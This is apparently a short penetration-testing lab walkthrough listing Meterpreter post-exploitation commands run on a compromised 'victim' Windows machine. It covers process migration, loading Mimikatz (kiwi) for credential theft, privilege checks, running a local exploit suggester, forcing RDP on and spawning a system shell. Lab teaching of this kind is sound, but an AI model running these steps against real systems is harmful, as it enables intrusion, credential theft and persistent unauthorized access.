2.3 Post-explotiation


Now that we've got a shell into our victim machine, let's take a look at several post-exploitation modules actions we can leverage.

1. Move to another proccess.
Let's list the processes using the command 'ps'.

meterpreter > ps


2. Move into the spool process or at least attempt to!
This won't work at the current time as we don't have sufficient privileges but we can still try!

meterpreter > migrate <PID>


3. Find out more information regarding the current user running the process we are in.

meterpreter > getuid


4. Find more information out about the system itself.

meterpreter > sysinfo


5. Load “Mimikatz” (more specifically the new version of mimikatz) so we can use it?

https://www.offensive-security.com/metasploit-unleashed/Mimikatz/

meterpreter > load kiwi


6. Figure out the privileges of our current user.

meterpreter > getprivs


7. Transfer files to our victim computer.

meterpreter > upload <filename>


8. Run a Metasploit module.

run


9. Figure out the networking information and interfaces on our victim.

meterpreter > ipconfig


10. Determine if we're in a VM, a very useful piece of knowledge for further pivoting.

meterpreter > run post/windows/gather/checkvm


11. Run within our session to elevate our privileges.

meterpreter > run post/multi/recon/local_exploit_suggester


12. Forcing RDP (Remote Desktop Protocol) to be available.
This won't work if you're not an administrator.

meterpreter > run post/windows/manage/enable_rdp


13. Spawn a normal system shell.

meterpreter > shell
